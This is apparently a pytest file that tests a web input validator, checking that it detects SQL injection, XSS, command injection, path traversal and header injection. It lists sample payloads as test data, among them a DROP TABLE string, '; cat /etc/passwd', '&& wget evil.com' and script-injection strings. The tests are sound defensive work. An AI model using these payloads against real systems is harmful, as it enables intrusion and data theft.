"""
Phase 1 Tests: Input Validation
Test input validation and sanitization
"""
import pytest
import sys
from pathlib import Path

# Add phase1_implementation to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.pysentry.core.validator import (
    InputValidator,
    ValidatedIPAddress,
    ValidatedThreat,
    ContentTypeValidator,
    validate_request_input,
    ValidationError
)
from fastapi import HTTPException


class TestInputValidator:
    """Test input validation"""
    
    @pytest.fixture
    def validator(self):
        """Create validator for testing"""
        return InputValidator()
    
    def test_sql_injection_detection(self, validator):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "' OR '1'='1",
            "1; DROP TABLE users;--",
            "UNION SELECT * FROM passwords",
            "admin'--",
        ]
        
        for input_str in malicious_inputs:
            threats = validator.validate_string(input_str, "test_field")
            assert 'sql_injection' in threats, f"Failed to detect SQL injection in: {input_str}"
    
    def test_xss_detection(self, validator):
        """Test XSS pattern detection"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<iframe src='evil.com'>",
        ]
        
        for input_str in malicious_inputs:
            threats = validator.validate_string(input_str, "test_field")
            assert 'xss' in threats, f"Failed to detect XSS in: {input_str}"
    
    def test_command_injection_detection(self, validator):
        """Test command injection pattern detection"""
        malicious_inputs = [
            "; cat /etc/passwd",
            "| ls -la",
            "&& wget evil.com",
            "$(whoami)",
            "`id`",
        ]
        
        for input_str in malicious_inputs:
            threats = validator.validate_string(input_str, "test_field")
            assert 'command_injection' in threats, f"Failed to detect command injection in: {input_str}"
    
    def test_path_traversal_detection(self, validator):
        """Test path traversal pattern detection"""
        malicious_inputs = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "%2e%2e/etc/passwd",
        ]
        
        for input_str in malicious_inputs:
            threats = validator.validate_string(input_str, "test_field")
            assert 'path_traversal' in threats, f"Failed to detect path traversal in: {input_str}"
    
    def test_clean_input(self, validator):
        """Test that clean input passes validation"""
        clean_inputs = [
            "normal text",
            "user@example.com",
            "product-name-123",
            "valid search query",
        ]
        
        for input_str in clean_inputs:
            threats = validator.validate_string(input_str, "test_field")
            assert len(threats) == 0, f"False positive for clean input: {input_str}"
    
    def test_header_validation(self, validator):
        """Test HTTP header validation"""
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
            "X-Custom": "valid-value"
        }
        
        threats = validator.validate_headers(headers)
        assert len(threats) == 0
    
    def test_header_injection_detection(self, validator):
        """Test header injection detection"""
        headers = {
            "X-Injected": "value\r\nInjected-Header: malicious"
        }
        
        threats = validator.validate_headers(headers)
        assert 'header_injection' in threats
    
    def test_request_size_validation(self, validator):
        """Test request size validation"""
        # Should not raise for small request
        validator.validate_request_size(1000)
        
        # Should raise for oversized request
        with pytest.raises(HTTPException) as exc_info:
            validator.validate_request_size(20 * 1024 * 1024)  # 20MB
        
        assert exc_info.value.status_code == 413
    
    def test_sanitize_string(self, validator):
        """Test string sanitization"""
        input_str = "test\x00string\x01with\x02control"
        sanitized = validator.sanitize_string(input_str)
        
        assert '\x00' not in sanitized
        assert '\x01' not in sanitized
        assert '\x02' not in sanitized
        assert 'test' in sanitized
        assert 'string' in sanitized


class TestPydanticModels:
    """Test Pydantic validation models"""
    
    def test_validated_ip_address_valid(self):
        """Test valid IP address"""
        ip = ValidatedIPAddress(ip_address="192.168.1.1")
        assert ip.ip_address == "192.168.1.1"
    
    def test_validated_ip_address_invalid_format(self):
        """Test invalid IP address format"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            ValidatedIPAddress(ip_address="not.an.ip")
    
    def test_validated_ip_address_invalid_octets(self):
        """Test IP address with invalid octets"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            ValidatedIPAddress(ip_address="256.256.256.256")
    
    def test_validated_threat_valid(self):
        """Test valid threat model"""
        threat = ValidatedThreat(
            threat_type="sql-injection",
            description="SQL injection attempt detected",
            severity=5,
            metadata={"source": "request_body"}
        )
        
        assert threat.threat_type == "sql-injection"
        assert threat.severity == 5
    
    def test_validated_threat_invalid_severity(self):
        """Test threat with invalid severity"""
        with pytest.raises(Exception):  # Pydantic ValidationError
            ValidatedThreat(
                threat_type="xss",
                description="XSS attempt",
                severity=10  # Out of range
            )
    
    def test_validated_threat_type_normalization(self):
        """Test threat type normalization to lowercase"""
        threat = ValidatedThreat(
            threat_type="SQL-Injection",
            description="Test",
            severity=3
        )
        
        assert threat.threat_type == "sql-injection"


class TestContentTypeValidator:
    """Test content type validation"""
    
    def test_allowed_content_types(self):
        """Test allowed content types"""
        allowed_types = [
            "application/json",
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
        ]
        
        for content_type in allowed_types:
            assert ContentTypeValidator.validate(content_type)
    
    def test_content_type_with_charset(self):
        """Test content type with charset parameter"""
        content_type = "application/json; charset=utf-8"
        assert ContentTypeValidator.validate(content_type)
    
    def test_disallowed_content_type(self):
        """Test disallowed content type"""
        content_type = "application/octet-stream"
        assert not ContentTypeValidator.validate(content_type)
    
    def test_none_content_type(self):
        """Test None content type (for GET requests)"""
        assert ContentTypeValidator.validate(None)


class TestValidateRequestInput:
    """Test complete request validation"""
    
    def test_clean_request(self):
        """Test validation of clean request"""
        result = validate_request_input(
            request_data="page=home&id=123",
            body_data='{"name": "test"}',
            headers={"User-Agent": "Mozilla/5.0"},
            content_length=100
        )
        
        assert result["valid"] is True
        assert len(result["threats"]) == 0
    
    def test_malicious_request(self):
        """Test validation of malicious request"""
        result = validate_request_input(
            request_data="id=1' OR '1'='1",
            body_data="<script>alert('xss')</script>",
            headers={"User-Agent": "Mozilla/5.0"},
            content_length=100
        )
        
        assert result["valid"] is False
        assert len(result["threats"]) > 0
    
    def test_oversized_request(self):
        """Test validation of oversized request"""
        with pytest.raises(HTTPException) as exc_info:
            validate_request_input(
                request_data="test",
                content_length=20 * 1024 * 1024  # 20MB
            )
        
        assert exc_info.value.status_code == 413


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
